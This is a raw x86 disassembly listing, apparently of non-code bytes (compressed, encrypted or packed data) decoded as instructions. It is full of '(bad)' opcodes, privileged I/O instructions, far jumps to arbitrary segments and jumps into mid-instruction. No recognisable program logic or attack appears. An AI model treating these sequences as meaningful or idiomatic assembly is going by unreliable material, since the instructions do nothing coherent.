  40b17c:	adc    eax,0xed06f638
  40b181:	and    al,0xb8
  40b183:	or     DWORD PTR [ebx],ebx
  40b185:	cmp    al,0x6c
  40b187:	shl    DWORD PTR [edx+0x58903ad8],0x6f
  40b18e:	cmp    ah,al
  40b190:	icebp  
  40b191:	sbb    DWORD PTR [esi+0x2b91fa5a],ecx
  40b197:	(bad)  
  40b198:	test   DWORD PTR [edi+esi*2],0x308ca053
  40b19f:	jge    0x40b190
  40b1a1:	mov    edx,0x6cc4d010
  40b1a6:	inc    ecx
  40b1a7:	fnsave [edi]
  40b1a9:	fwait
  40b1aa:	les    ebx,FWORD PTR [ebp+0x2b]
  40b1ad:	sub    eax,0x602145d4
  40b1b2:	dec    ebp
  40b1b3:	cld    
  40b1b4:	add    BYTE PTR [ebx-0x5595881a],cl
  40b1ba:	mov    WORD PTR [esi-0x1a],fs
  40b1bd:	jae    0x40b1ca
  40b1bf:	mov    ds:0x81e152f8,al
  40b1c4:	pusha  
  40b1c5:	push   esp
  40b1c6:	ins    DWORD PTR es:[edi],dx
  40b1c7:	push   ds
  40b1c8:	xchg   DWORD PTR [eax],esp
  40b1ca:	pop    es
  40b1cb:	shr    DWORD PTR [eax],cl
  40b1cd:	xlat   BYTE PTR ds:[ebx]
  40b1ce:	mov    eax,ds:0x9377323d
  40b1d3:	pushf  
  40b1d4:	pushf  
  40b1d5:	test   BYTE PTR [edx-0x6349e009],0x3d
  40b1dc:	or     al,0xac
  40b1de:	sbb    al,0xc2
  40b1e0:	icebp  
  40b1e1:	ret    
  40b1e2:	cmp    al,0x4f
  40b1e4:	mov    al,0xc
  40b1e6:	dec    edx
  40b1e7:	aas    
  40b1e8:	mov    esp,0xcf846702
  40b1ed:	sbb    ebp,DWORD PTR [esp+edx*1+0x6f56d2b7]
  40b1f4:	jno    0x40b1e9
  40b1f6:	inc    eax
  40b1f7:	popf   
  40b1f8:	or     eax,0x4cf4193d
  40b1fd:	jae    0x40b25a
  40b1ff:	xchg   BYTE PTR [esi],bl
  40b201:	sar    DWORD PTR [ebp+esi*2-0x42],cl
  40b205:	xor    bh,dh
  40b207:	sbb    dh,bh
  40b209:	and    DWORD PTR [edx],ebx
  40b20b:	sti    
  40b20c:	add    al,0xc1
  40b20e:	xor    DWORD PTR [edi+0x670f7041],edx
  40b214:	ret    0x99f1
  40b217:	fadd   QWORD PTR [ebx+0x29]
  40b21a:	sbb    DWORD PTR [ecx-0x5f],edx
  40b21d:	rcl    DWORD PTR [ebx],0xe0
  40b220:	dec    ecx
  40b221:	lea    edx,[edi]
  40b223:	outs   dx,DWORD PTR ds:[esi]
  40b224:	ds jmp 0x40b223
  40b227:	dec    esp
  40b228:	pop    ecx
  40b229:	das    
  40b22a:	adc    dh,BYTE PTR [ebx-0x46]
  40b22d:	jb     0x40b247
  40b22f:	popf   
  40b230:	(bad)  
  40b231:	aam    0x7e
  40b233:	jge    0x40b28c
  40b235:	fsubr  QWORD PTR [ebp-0x2d59de7a]
  40b23b:	xchg   ebp,eax
  40b23c:	leave  
  40b23d:	push   ebx
  40b23e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b23f:	inc    esp
  40b240:	jo     0x40b1d6
  40b242:	fidivr DWORD PTR [ecx+0x71]
  40b245:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b246:	fs xchg edi,eax
  40b248:	aad    0xd5
  40b24a:	iret   
  40b24b:	fwait
  40b24c:	cld    
  40b24d:	mov    esi,0x2ef336cf
  40b252:	sbb    BYTE PTR ds:0x36b596c9,dh
  40b258:	out    0xfa,eax
  40b25a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b25b:	ror    DWORD PTR [esi],cl
  40b25d:	(bad)  
  40b25e:	int3   
  40b25f:	cmp    DWORD PTR [esi],ebx
  40b261:	mov    ebp,0x25b086cf
  40b266:	out    0xe1,al
  40b268:	dec    esi
  40b269:	in     al,0x23
  40b26b:	cmc    
  40b26c:	mov    eax,0x1e049705
  40b271:	mov    BYTE PTR [edx],cl
  40b273:	dec    esp
  40b274:	aad    0x96
  40b276:	test   DWORD PTR [ecx],edx
  40b278:	cmp    eax,0x7255040d
  40b27d:	dec    edi
  40b27e:	jge    0x40b2f6
  40b280:	enter  0xd73a,0x10
  40b284:	and    al,0x79
  40b286:	mov    eax,esi
  40b288:	mov    dl,0x25
  40b28a:	cmp    al,0xff
  40b28c:	mov    DWORD PTR [edx+0x38a1663b],ebx
  40b292:	sub    dh,BYTE PTR [esi+0x26]
  40b295:	mov    esi,0xeedb3825
  40b29a:	xor    al,0x50
  40b29c:	sub    al,0x59
  40b29e:	jbe    0x40b29f
  40b2a0:	mov    ebp,ecx
  40b2a2:	or     eax,0xbadce3a8
  40b2a7:	push   ecx
  40b2a8:	pop    ebp
  40b2a9:	aam    0x29
  40b2ab:	daa    
  40b2ac:	push   cs
  40b2ad:	pop    esi
  40b2ae:	adc    edx,DWORD PTR [edi]
  40b2b0:	mov    dl,0xff
  40b2b2:	dec    edx
  40b2b3:	repnz xor bl,BYTE PTR [eax+0x21]
  40b2b7:	mov    edx,0xd26dc4
  40b2bc:	les    eax,FWORD PTR [esi-0x20]
  40b2bf:	pop    esi
  40b2c0:	xor    bl,BYTE PTR [esi-0xe892b32]
  40b2c6:	sub    BYTE PTR [ebx+0x19],bl
  40b2c9:	xchg   ebp,eax
  40b2ca:	jb     0x40b2e4
  40b2cc:	xchg   edx,eax
  40b2cd:	popf   
  40b2ce:	maskmovq mm0,(bad)
  40b2cf:	test   DWORD PTR [edi+0x5c],0xe7995ef7
  40b2d6:	jb     0x40b324
  40b2d8:	mov    eax,ds:0xfec63de6
  40b2dd:	xlat   BYTE PTR ds:[ebx]
  40b2de:	out    dx,eax
  40b2df:	inc    ecx
  40b2e0:	int3   
  40b2e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2e2:	fist   WORD PTR [ecx]
  40b2e4:	add    DWORD PTR [ecx+ebx*1],edx
  40b2e7:	arpl   dx,di
  40b2e9:	stos   DWORD PTR es:[edi],eax
  40b2ea:	fcomp  QWORD PTR [ebx+0x15]
  40b2ed:	cmp    al,0xf5
  40b2ef:	imul   ebx,DWORD PTR [ebx+0x7a80185],0x13049ae3
  40b2f9:	dec    esi
  40b2fa:	dec    edi
  40b2fb:	adc    BYTE PTR [ebp+0x2d],dl
  40b2fe:	add    edx,DWORD PTR [eax-0xd]
  40b301:	shl    cl,cl
  40b303:	mov    ds:0x86885410,al
  40b308:	xchg   ecx,eax
  40b309:	pop    es
  40b30a:	sahf   
  40b30b:	fist   DWORD PTR [ebx+0x9105aa7]
  40b311:	or     BYTE PTR [ecx+0x488272e8],ch
  40b317:	rol    DWORD PTR [ebp+0x11802fb5],1
  40b31d:	xor    DWORD PTR [edi+0x56],esp
  40b320:	inc    edx
  40b321:	or     DWORD PTR [edx-0x72],edx
  40b324:	cld    
  40b325:	imul   edx,esp,0x1935dff1
  40b32b:	(bad)  
  40b32d:	mov    ebx,0x5e9c73b1
  40b332:	sbb    BYTE PTR [esi],0x2
  40b335:	sub    al,0x9d
  40b337:	mov    ecx,edi
  40b339:	js     0x40b38c
  40b33b:	mov    ds:0xfb1a9c9d,eax
  40b340:	fiadd  DWORD PTR [eax]
  40b342:	clc    
  40b343:	push   esi
  40b344:	aam    0xd2
  40b346:	cmp    eax,0xf17f45d8
  40b34b:	call   0x4fd3d9c8
  40b350:	retf   0x1b7b
  40b353:	jo     0x40b2d9
  40b355:	cld    
  40b356:	sbb    eax,0xe1b0145b
  40b35b:	je     0x40b33f
  40b35d:	xchg   ebp,eax
  40b35e:	out    dx,al
  40b35f:	xor    al,0xbe
  40b361:	sub    DWORD PTR [esi-0x6117bc9],0xc1d781bf
  40b36b:	inc    edi
  40b36c:	pop    ss
  40b36d:	mov    ah,0xca
  40b36f:	push   ecx
  40b370:	xor    ah,bh
  40b372:	push   edx
  40b373:	push   es
  40b374:	pop    eax
  40b375:	add    BYTE PTR ds:[edi+eiz*4+0x77],bh
  40b37a:	in     eax,dx
  40b37b:	retf   
  40b37c:	fimul  WORD PTR ds:0x1757426
  40b382:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b383:	pop    esp
  40b384:	sub    ecx,DWORD PTR [edx+0x7cbac119]
  40b38a:	push   edi
  40b38b:	and    bl,bl
  40b38d:	sub    cl,BYTE PTR [ebx+eiz*8+0x20b61eb0]
  40b394:	ret    0x8759
  40b397:	inc    edi
  40b398:	push   0x8ada2aac
  40b39d:	xor    al,0x5e
  40b39f:	dec    edi
  40b3a0:	lea    esi,ds:0x5e206d12
  40b3a6:	(bad)  
  40b3a7:	cmp    ah,cl
  40b3a9:	cmp    ebx,ecx
  40b3ab:	pop    edi
  40b3ac:	shl    DWORD PTR [ecx],cl
  40b3ae:	loop   0x40b387
  40b3b0:	out    dx,eax
  40b3b1:	pop    esp
  40b3b2:	sbb    DWORD PTR [esi-0x60],esp
  40b3b5:	shr    ecx,cl
  40b3b7:	jae    0x40b36f
  40b3b9:	xor    al,0xee
  40b3bb:	(bad)  
  40b3bc:	xchg   esp,eax
  40b3bd:	mov    ebx,DWORD PTR [edi+0x4eecab15]
  40b3c3:	cmp    cl,BYTE PTR [esi]
  40b3c5:	stos   DWORD PTR es:[edi],eax
  40b3c6:	std    
  40b3c7:	bound  edx,QWORD PTR ds:0x40e87740
  40b3cd:	fiadd  DWORD PTR [eax+ecx*8-0x1939f2d]
  40b3d4:	sbb    edx,edi
  40b3d6:	xor    DWORD PTR [eax-0x49],ecx
  40b3d9:	adc    BYTE PTR [eax-0x4f],dl
  40b3dc:	lods   eax,DWORD PTR ds:[esi]
  40b3dd:	dec    edi
  40b3de:	bound  eax,QWORD PTR [ecx]
  40b3e0:	ficom  DWORD PTR [eax+0x1]
  40b3e3:	(bad)  
  40b3e4:	int    0x8c
  40b3e6:	sub    eax,0x5d0eda32
  40b3eb:	dec    ebx
  40b3ec:	test   BYTE PTR [eax-0x72],al
  40b3ef:	arpl   WORD PTR [ecx-0x12297de4],cx
  40b3f5:	and    al,BYTE PTR [eax-0x1bc49d27]
  40b3fb:	or     ah,BYTE PTR [eax+0x41]
  40b3fe:	adc    al,0x34
  40b400:	mov    ebx,0xf2fc2e1b
  40b405:	mov    dh,0x6e
  40b407:	inc    eax
  40b408:	jae    0x40b3e3
  40b40a:	inc    ebx
  40b40b:	and    ebp,edi
  40b40d:	sahf   
  40b40e:	xor    eax,0x65c7811b
  40b413:	and    DWORD PTR [esp+eax*2+0x1354acc1],eax
  40b41a:	mov    dl,0x9f
  40b41c:	push   ds
  40b41d:	out    dx,eax
  40b41e:	dec    ebp
  40b41f:	daa    
  40b420:	or     dh,ch
  40b422:	popa   
  40b423:	sbb    eax,0xd6282d19
  40b428:	xchg   ebp,eax
  40b429:	mov    WORD PTR [eax+0x50],ss
  40b42c:	in     al,dx
  40b42d:	pop    esi
  40b42e:	inc    esi
  40b42f:	in     al,dx
  40b430:	rcl    DWORD PTR [eax+eax*1],1
  40b433:	rcr    BYTE PTR [ebx+0x5b],cl
  40b436:	arpl   WORD PTR [esi],ax
  40b438:	jno    0x40b440
  40b43a:	and    edi,DWORD PTR [ecx+ebp*2+0x6dd1afb6]
  40b441:	push   ss
  40b442:	xchg   edi,eax
  40b443:	lods   al,BYTE PTR ds:[esi]
  40b444:	inc    BYTE PTR [ebp-0x75]
  40b447:	rcl    BYTE PTR [ebx-0x5e44af53],0x17
  40b44e:	pop    ebx
  40b44f:	inc    edi
  40b450:	pop    ecx
  40b451:	adc    ebp,DWORD PTR [eax+0x5b]
  40b454:	add    BYTE PTR [edx+0x53],dh
  40b457:	adc    al,0x5f
  40b459:	add    eax,ebp
  40b45b:	jle    0x40b4b5
  40b45d:	sub    BYTE PTR [ebx],0x96
  40b460:	fbstp  TBYTE PTR ss:[esi+0x25eda53e]
  40b467:	jb     0x40b41b
  40b469:	adc    ch,BYTE PTR [ebx]
  40b46b:	shr    BYTE PTR [ecx],1
  40b46d:	push   ebx
  40b46e:	sbb    edx,0xfffffffd
  40b471:	test   eax,0xa04f8b47
  40b476:	xchg   ebp,eax
  40b477:	or     BYTE PTR [esi-0x78e4522a],0x3
  40b47e:	pop    ebp
  40b47f:	stc    
  40b480:	add    BYTE PTR [edx],al
  40b482:	dec    ecx
  40b483:	pop    ds
  40b484:	sahf   
  40b485:	ss ins BYTE PTR es:[edi],dx
  40b487:	repz or bl,BYTE PTR [bx+si]
  40b48b:	sub    edx,DWORD PTR [eax]
  40b48d:	mov    bl,0xe0
  40b48f:	push   esp
  40b490:	ret    0x15c0
  40b493:	adc    BYTE PTR [ecx],ah
  40b495:	test   BYTE PTR [esi-0x3b],bh
  40b498:	adc    cl,0x76
  40b49b:	test   al,0xe4
  40b49d:	add    al,0x5c
  40b4a0:	je     0x40b4ce
  40b4a2:	add    eax,0x3e4c956f
  40b4a7:	pop    ebp
  40b4a8:	adc    DWORD PTR [ecx],ebp
  40b4aa:	into   
  40b4ab:	lods   eax,DWORD PTR ds:[esi]
  40b4ac:	rol    DWORD PTR [ebp-0x5b7b3ead],0x6b
  40b4b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b4b4:	test   BYTE PTR [edx+edx*2-0x28],dh
  40b4b8:	js     0x40b483
  40b4ba:	jmp    0x914d:0x880c42c5
  40b4c1:	(bad)  
  40b4c2:	pop    ds
  40b4c3:	xchg   ebx,eax
  40b4c4:	rcr    eax,0x4
  40b4c7:	mov    WORD PTR [esp+ecx*4-0x16],ds
  40b4cb:	out    dx,eax
  40b4cc:	jmp    0xb7e0b55a
  40b4d1:	mov    ebx,0xb5c2ddfb
  40b4d6:	rcl    BYTE PTR [esp+edx*1],0xd6
  40b4da:	sub    al,BYTE PTR [ebx-0x7fba5d09]
  40b4e0:	das    
  40b4e1:	cmp    eax,0x4dedec86
  40b4e6:	fistp  WORD PTR [ecx-0x63b1c485]
  40b4ec:	mov    dh,BYTE PTR [ebx-0x70]
  40b4ef:	mov    eax,0x689014a4
  40b4f4:	lahf   
  40b4f5:	mov    BYTE PTR [eax],cl
  40b4f7:	lahf   
  40b4f8:	sbb    eax,0x7f57bcc4
  40b4fd:	adc    eax,0xbaa608d
  40b502:	aad    0xb5
  40b504:	mov    eax,ds:0x5d4841d0
  40b509:	int    0x61
  40b50b:	sub    eax,0x7e04e6b6
  40b510:	jb     0x40b566
  40b512:	or     eax,0x8c820ed1
  40b517:	cmp    al,0x23
  40b519:	es pop ds
  40b51b:	or     al,0xad
  40b51d:	ret    
  40b51e:	shl    DWORD PTR [edi],0xd4
  40b521:	jb     0x40b55c
  40b523:	inc    edx
  40b524:	pop    ebp
  40b525:	in     eax,dx
  40b526:	jno    0x40b4e0
  40b528:	sbb    al,0xdd
  40b52a:	pop    ebx
  40b52b:	(bad)  
  40b52c:	jmp    0x40b55f
  40b52e:	cld    
  40b52f:	jno    0x40b4b5
  40b531:	mov    bh,0xa8
  40b533:	mov    bl,0xe0
  40b535:	and    BYTE PTR [eax+0x1319e52],al
  40b53b:	mov    cl,0xfe
  40b53d:	rol    DWORD PTR [ebp+0x328b982c],1
  40b543:	in     eax,dx
  40b544:	pop    esp
  40b545:	inc    esp
  40b546:	mov    ecx,0x4552d90a
  40b54b:	push   cs
  40b54c:	push   cs
  40b54d:	jp     0x40b513
  40b54f:	rcr    BYTE PTR [ecx-0x36cde493],0xc
  40b556:	mov    eax,0x6c1759b6
  40b55b:	mov    ds:0xb7995556,al
  40b560:	(bad)  
  40b561:	sbb    DWORD PTR [edx-0x19],edi
  40b564:	push   esi
  40b565:	mov    cl,0x87
  40b567:	idiv   DWORD PTR ds:0xf5e2e3b4
  40b56d:	mov    ebp,0xfea602e0
  40b572:	je     0x40b56d
  40b574:	fadd   DWORD PTR [edx-0x76]
  40b577:	in     eax,0x60
  40b579:	ds pop ss
  40b57b:	pop    eax
  40b57c:	cmp    al,0x42
  40b57e:	neg    ebx
  40b580:	enter  0xe837,0x67
  40b584:	mov    eax,ds:0x3f8ef1a9
  40b589:	fwait
  40b58a:	cs add al,0x51
  40b58d:	pop    ecx
  40b58e:	jne    0x40b5a5
  40b590:	fnstsw WORD PTR [eax-0x27ef8d86]
  40b596:	adc    BYTE PTR [esi-0x20],0x72
  40b59a:	dec    ecx
  40b59b:	cdq    
  40b59c:	xchg   ebp,eax
  40b59d:	fidiv  WORD PTR [edx+0x47041158]
  40b5a3:	mov    eax,ecx
  40b5a5:	xor    BYTE PTR [eax],al
  40b5a7:	add    al,0x63
  40b5a9:	aaa    
  40b5aa:	lds    edi,FWORD PTR [edi-0x57de93c4]
  40b5b0:	jecxz  0x40b5b7
  40b5b2:	dec    esi
  40b5b3:	les    ecx,FWORD PTR [ebx-0x22]
  40b5b6:	int3   
  40b5b7:	shr    DWORD PTR [ebp+0x717f8fc3],1
  40b5bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b5be:	arpl   WORD PTR [edi],sp
  40b5c0:	les    ebp,FWORD PTR gs:[eax+0x20dd5666]
  40b5c7:	fist   WORD PTR [eax]
  40b5c9:	mov    bl,0xe2
  40b5cb:	jo     0x40b597
  40b5cd:	jge    0x40b580
  40b5cf:	push   esi
  40b5d0:	mov    ds:0x7bb87c5f,al
  40b5d5:	rcr    DWORD PTR [ebp-0x26],cl
  40b5d8:	out    dx,eax
  40b5d9:	push   eax
  40b5da:	in     eax,0x13
  40b5dc:	fstp   QWORD PTR [esi]
  40b5de:	mov    eax,0xbeebcd62
  40b5e3:	pop    eax
  40b5e4:	sbb    dl,BYTE PTR [ecx]
  40b5e6:	jmp    0xb838:0xb5684d2d
  40b5ed:	add    ebx,eax
  40b5ef:	and    BYTE PTR [esi-0x5f1b87a],bh
  40b5f5:	js     0x40b57f
  40b5f7:	jg     0x40b638
  40b5f9:	dec    DWORD PTR [edx+esi*1-0x399f88b1]
  40b600:	pop    ecx
  40b601:	or     bh,bh
  40b603:	xor    bh,BYTE PTR [esi+0x13]
  40b606:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b607:	ins    DWORD PTR es:[edi],dx
  40b608:	cdq    
  40b609:	and    bl,BYTE PTR [edx+eiz*2]
  40b60c:	jnp    0x40b627
  40b60e:	aad    0x5
  40b610:	add    ebx,ebp
  40b612:	adc    ebp,DWORD PTR [ecx+0x786d929c]
  40b618:	lea    esi,[edi*2+0x2c1b079a]
  40b61f:	mov    al,0x51
  40b621:	or     bh,BYTE PTR [ecx+0x20]
  40b624:	rol    BYTE PTR [ecx-0x2f0f9bdd],1
  40b62a:	inc    ecx
  40b62b:	icebp  
  40b62c:	add    BYTE PTR [ecx],0x57
  40b62f:	rcl    DWORD PTR [bx+di],1
  40b632:	cmp    eax,0x9e18c983
  40b637:	or     DWORD PTR [ecx-0x80],ecx
  40b63a:	jmp    0xdd28:0x709ac0f6
  40b641:	pop    eax
  40b642:	test   DWORD PTR [edi],esp
  40b644:	jl     0x40b609
  40b646:	sub    BYTE PTR [edx+eax*4-0x7f],bl
  40b64a:	ins    DWORD PTR es:[edi],dx
  40b64b:	stos   DWORD PTR es:[edi],eax
  40b64c:	outs   dx,BYTE PTR ds:[esi]
  40b64d:	sbb    dh,BYTE PTR [edi+0x814964f]
  40b653:	cli    
  40b654:	dec    ecx
  40b655:	cmp    al,0xfe
  40b657:	xor    al,0x11
  40b659:	cmp    ebp,DWORD PTR [esi+0x55]
  40b65c:	xchg   al,ah
  40b65e:	xchg   ecx,eax
  40b65f:	lods   eax,DWORD PTR ds:[esi]
  40b660:	sub    ecx,DWORD PTR [ecx+0x3a13ee3d]
  40b666:	leave  
  40b667:	sbb    al,0x8f
  40b669:	cmp    ebp,0x68e60837
  40b66f:	out    dx,al
  40b670:	hlt    
  40b671:	or     DWORD PTR [esi+0x31],ebx
  40b674:	mov    ds:0xcf092c26,al
  40b679:	cmp    DWORD PTR [ecx],0xb6c9e9f9
  40b67f:	dec    ebp
  40b680:	popa   
  40b681:	daa    
  40b682:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b683:	mov    ah,BYTE PTR ds:0x68b8d0fc
  40b689:	mov    ch,0x2d
  40b68b:	dec    eax
  40b68c:	cmp    BYTE PTR [ebx+0x79],cl
  40b68f:	push   ss
  40b690:	mov    DWORD PTR [esi+0x3a],ebp
  40b693:	les    ebx,FWORD PTR [ebx+0x29]
  40b696:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b697:	pop    edi
  40b698:	(bad)  
  40b699:	push   esi
  40b69a:	sub    BYTE PTR [esi+esi*4],cl
  40b69d:	mov    cl,0x31
  40b69f:	sbb    DWORD PTR [ebx-0x7d119c4],0x784e52c8
  40b6a9:	mov    edi,0xa2112fea
  40b6ae:	fs xor al,0xf
  40b6b1:	fst    QWORD PTR [esi]
  40b6b3:	adc    al,0x34
  40b6b5:	cdq    
  40b6b6:	mov    bl,0x4c
  40b6b8:	shr    BYTE PTR [esi+0x3dbc494b],cl
  40b6be:	push   0x83a54d7f
  40b6c3:	test   eax,0x73e49ca
  40b6c9:	and    eax,0xff533d0e
  40b6ce:	aaa    
  40b6cf:	xchg   edi,eax
  40b6d0:	dec    eax
  40b6d1:	add    DWORD PTR [edx-0xcca679d],eax
  40b6d7:	or     eax,0x40546a50
  40b6dc:	push   edx
  40b6dd:	nop
  40b6de:	test   BYTE PTR [edx+edx*4+0x7960e33b],ch
  40b6e5:	pushf  
  40b6e6:	mov    edi,0xfe8b7d0b
  40b6eb:	inc    ecx
  40b6ec:	(bad)  
  40b6ed:	xlat   BYTE PTR ds:[ebx]
  40b6ee:	outs   dx,DWORD PTR ds:[esi]
  40b6ef:	scas   al,BYTE PTR es:[edi]
  40b6f0:	repz rcr BYTE PTR [edx+esi*2],cl
  40b6f4:	lods   al,BYTE PTR ds:[esi]
  40b6f5:	imul   esp,DWORD PTR ds:0x7a5f44fe,0x70
  40b6fc:	push   es
  40b6fd:	mov    edi,0x88d75daa
  40b702:	adc    eax,esp
  40b704:	sub    edx,ebp
  40b706:	std    
  40b707:	sbb    eax,0x218163c5
  40b70c:	in     al,dx
  40b70d:	mov    eax,ds:0xa7f2dd3e
  40b712:	pop    edx
  40b713:	iret   
  40b714:	outs   dx,DWORD PTR ds:[esi]
  40b715:	mov    cs,WORD PTR [esi+0x1c]
  40b718:	add    edi,DWORD PTR [esi-0x7d0b93f1]
  40b71e:	les    ebp,FWORD PTR ss:[edi-0x6b]
  40b722:	mov    cs,WORD PTR [edx]
  40b724:	dec    ebp
  40b725:	stos   BYTE PTR es:[edi],al
  40b726:	das    
  40b727:	sbb    al,dh
  40b729:	mov    DWORD PTR [edx-0x6dc6aa18],ebx
  40b72f:	int    0xcc
  40b731:	or     eax,0x18eaa60
  40b736:	daa    
  40b737:	retf   0x1c07
  40b73a:	repnz push 0xffffffdc
  40b73d:	(bad)  
  40b73f:	add    eax,0x999b5460
  40b744:	ret    0x727
  40b747:	jmp    0xa2841914
  40b74c:	in     eax,0xa3
  40b74e:	sub    eax,0x29828570
  40b753:	stc    
  40b754:	(bad)  
  40b755:	stc    
  40b756:	popa   
  40b757:	jns    0x40b6e7
  40b759:	adc    ebp,DWORD PTR [ebx]
  40b75b:	in     al,dx
  40b75c:	mov    dh,0xe1
  40b75e:	push   ds
  40b75f:	sub    edx,DWORD PTR [eax-0xbfafaec]
  40b765:	pop    eax
  40b766:	cmp    cl,BYTE PTR [ecx+0x2c71ea1f]
  40b76c:	(bad)  
  40b76d:	dec    edi
  40b76e:	jmp    0xa172:0x90781e62
  40b775:	inc    ebx
  40b776:	icebp  
  40b777:	jg     0x40b713
  40b779:	jns    0x40b78c
  40b77b:	dec    edi
  40b77c:	out    dx,al
  40b77d:	(bad)  
  40b77e:	sbb    DWORD PTR [edx-0xf106c27],ebx
  40b784:	ins    DWORD PTR es:[edi],dx
  40b785:	jmp    0xcbd58f7f
  40b78a:	adc    cl,BYTE PTR [esi]
  40b78c:	add    ebp,DWORD PTR [eax-0x48]
  40b78f:	add    al,dh
  40b791:	cmp    al,BYTE PTR ds:0xda6f9775
  40b797:	push   edi
  40b798:	or     al,0x3c
  40b79a:	or     eax,0x857a09c6
  40b79f:	lock adc BYTE PTR [ebx+0xddda320],al
  40b7a6:	mov    DWORD PTR [eax+0x49],esi
  40b7a9:	dec    esp
  40b7aa:	shl    esp,1
  40b7ac:	or     DWORD PTR [eax],ecx
  40b7ae:	sbb    esp,DWORD PTR [edi-0x6481e55e]
  40b7b4:	push   ss
  40b7b5:	xchg   esi,eax
  40b7b6:	xor    ebx,ebp
  40b7b8:	jae    0x40b7c5
  40b7ba:	inc    esi
  40b7bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7bc:	sub    al,0x23
  40b7be:	gs dec eax
  40b7c0:	jmp    0x40b74b
  40b7c2:	xor    eax,ebp
  40b7c4:	cmp    ebx,esi
  40b7c6:	adc    bh,BYTE PTR [eax+0x27]
  40b7c9:	loop   0x40b7ed
  40b7cb:	cmp    BYTE PTR [eax+0x75850886],dh
  40b7d1:	ins    DWORD PTR es:[edi],dx
  40b7d2:	inc    eax
  40b7d3:	mov    ds:0x93ac9d82,al
  40b7d8:	rcr    BYTE PTR [ebx+0x1f4a8170],1
  40b7de:	std    
  40b7df:	dec    esi
  40b7e0:	ret    
  40b7e1:	in     eax,dx
  40b7e2:	push   ebx
  40b7e3:	jecxz  0x40b85e
  40b7e5:	loop   0x40b7fa
  40b7e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b7e8:	mov    edi,0x86f2937d
  40b7ed:	(bad)  
  40b7ee:	jp     0x40b827
  40b7f0:	sbb    esi,edi
  40b7f2:	mov    edi,0xa88cb922
  40b7f7:	add    ah,ah
  40b7f9:	xchg   ebp,eax
  40b7fa:	cs pop ss
  40b7fc:	inc    edi
  40b7fd:	test   eax,0x9742d637
  40b802:	cmp    edi,esi
  40b804:	xchg   edx,eax
  40b805:	xor    al,0xa6
  40b807:	pop    edi
  40b808:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b809:	adc    al,0x64
  40b80c:	pop    es
  40b80d:	fisubr DWORD PTR [ecx-0x47]
  40b810:	xor    BYTE PTR [ebx-0x29816125],0x87
  40b817:	lock push cs
  40b819:	push   ebx
  40b81a:	cmovb  ebp,DWORD PTR [esi]
  40b81d:	clc    
  40b81e:	fwait
  40b81f:	inc    ebp
  40b820:	fcmovbe st,st(3)
  40b822:	data16 jb 0x40b892
  40b825:	into   
  40b826:	cmp    dh,BYTE PTR [edi+0x24]
  40b829:	jbe    0x40b7f8
  40b82b:	aaa    
  40b82c:	mov    al,0x6c
  40b82e:	push   es
  40b82f:	mov    eax,DWORD PTR [ebp+0x35]
  40b832:	cs jg  0x40b7e6
  40b835:	pop    esp
  40b836:	aam    0xcd
  40b838:	jae    0x40b7f7
  40b83a:	mov    esp,0x486fd17e
  40b83f:	sub    al,0x72
  40b841:	push   esp
  40b842:	popf   
  40b843:	mov    dl,0x56
  40b845:	cmc    
  40b846:	pushf  
  40b847:	retf   0x7074
  40b84a:	fbld   TBYTE PTR [ecx]
  40b84c:	ins    DWORD PTR es:[edi],dx
  40b84d:	jp     0x40b8a6
  40b84f:	push   esi
  40b850:	ss inc ecx
  40b852:	mov    ecx,0xf4fb281a
  40b857:	or     dh,cl
  40b859:	mov    bh,0xbf
  40b85b:	push   edx
  40b85c:	ds jmp 0x40b8d6
  40b85f:	push   cs
  40b860:	out    0xa1,eax
  40b862:	out    0x5d,eax
  40b864:	dec    ecx
  40b865:	out    0xde,eax
  40b867:	or     DWORD PTR fs:[esp+edi*1-0x3d],ecx
  40b86c:	xchg   edx,eax
  40b86d:	and    eax,0x18e31f3a
  40b872:	jl     0x40b8ce
  40b874:	or     eax,0x686e18f8
  40b879:	dec    eax
  40b87a:	lds    esi,FWORD PTR [ecx-0x732b8fc0]
  40b880:	adc    dl,bh
  40b882:	imul   BYTE PTR [ecx+0x6b5b2722]
  40b888:	xchg   esp,eax
  40b889:	cs loop 0x40b893
  40b88c:	pop    esp
  40b88d:	or     ebp,DWORD PTR [esi]
  40b88f:	push   esp
  40b890:	inc    ebp
  40b891:	ins    DWORD PTR es:[edi],dx
  40b892:	inc    ecx
  40b893:	mov    cl,0x90
  40b895:	cwde   
  40b896:	test   ebx,ebx
  40b898:	fistp  WORD PTR [eax-0xd77e5c1]
  40b89e:	jne    0x40b874
  40b8a0:	fstp   DWORD PTR [edi]
  40b8a2:	icebp  
  40b8a3:	pop    esi
  40b8a4:	sub    al,0x5e
  40b8a6:	xor    BYTE PTR [ecx+0x30],ch
  40b8a9:	xchg   edx,edi
  40b8ab:	jmp    0x34f1ad3a
  40b8b0:	loope  0x40b856
  40b8b2:	xor    ecx,DWORD PTR [ecx-0x63fd5a96]
  40b8b8:	sub    dh,ch
  40b8ba:	mov    ds:0xd0a6f0b4,al
  40b8bf:	pop    esi
  40b8c0:	stc    
  40b8c1:	xor    al,0x7d
  40b8c3:	pop    ecx
  40b8c4:	sub    esp,esp
  40b8c6:	mov    cl,BYTE PTR [ebx]
  40b8c8:	and    bl,BYTE PTR [ecx+0x2aab6179]
  40b8ce:	or     BYTE PTR [ecx],ah
  40b8d0:	dec    eax
  40b8d1:	es call 0x475f2a46
  40b8d7:	scas   eax,DWORD PTR es:[edi]
  40b8d8:	lods   al,BYTE PTR ds:[esi]
  40b8d9:	mov    ebp,0xad2dc7e9
  40b8de:	push   edi
  40b8df:	shl    BYTE PTR [ebp-0x54],1
  40b8e2:	jno    0x40b8bb
  40b8e4:	es jecxz 0x40b944
  40b8e7:	out    dx,eax
  40b8e8:	repnz adc eax,0x52d9c5c8
